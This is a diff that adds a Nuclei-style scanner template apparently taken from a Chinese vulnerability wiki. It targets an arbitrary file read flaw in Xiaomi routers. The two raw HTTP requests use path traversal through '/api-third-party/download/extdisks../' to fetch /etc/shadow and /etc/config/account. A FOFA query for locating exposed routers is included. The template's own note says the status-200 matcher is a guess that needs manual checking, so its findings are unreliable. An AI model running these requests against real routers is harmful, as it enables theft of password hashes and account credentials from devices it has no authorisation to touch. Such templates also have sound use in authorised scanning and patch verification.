@@ -1,0 +1,40 @@
+id: poc-0802d00b0a9d13dd6d48
+info:
+  name: 小米路由器任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0802d00b0a9d13dd6d48170a08676db6
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 0802d00b0a9d13dd6d48170a08676db6
+    fofa: app="小米路由器"
+http:
+- raw:
+  - 'GET /api-third-party/download/extdisks../etc/shadow HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /api-third-party/download/extdisks../etc/config/account HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
